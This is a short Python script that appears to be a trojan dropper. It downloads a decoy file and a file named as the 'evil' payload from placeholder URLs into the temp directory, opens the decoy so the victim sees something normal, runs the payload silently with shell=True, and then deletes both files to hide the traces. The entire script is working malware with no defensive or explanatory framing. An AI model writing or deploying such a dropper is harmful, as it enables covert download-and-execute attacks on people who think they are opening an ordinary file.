front_file = "FRONT_FILE_URL"
evil_file = "EVIL_FILE_URL"

import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = get_file_name(url)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def get_file_name(url):
    return url.split("/")[-1]


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download(front_file)
front_file_name = get_file_name(front_file)
subprocess.Popen(front_file_name, shell=True)

download(evil_file)
evil_file_name = get_file_name(evil_file)
subprocess.call(evil_file_name, shell=True)

os.remove(front_file_name)
os.remove(evil_file_name)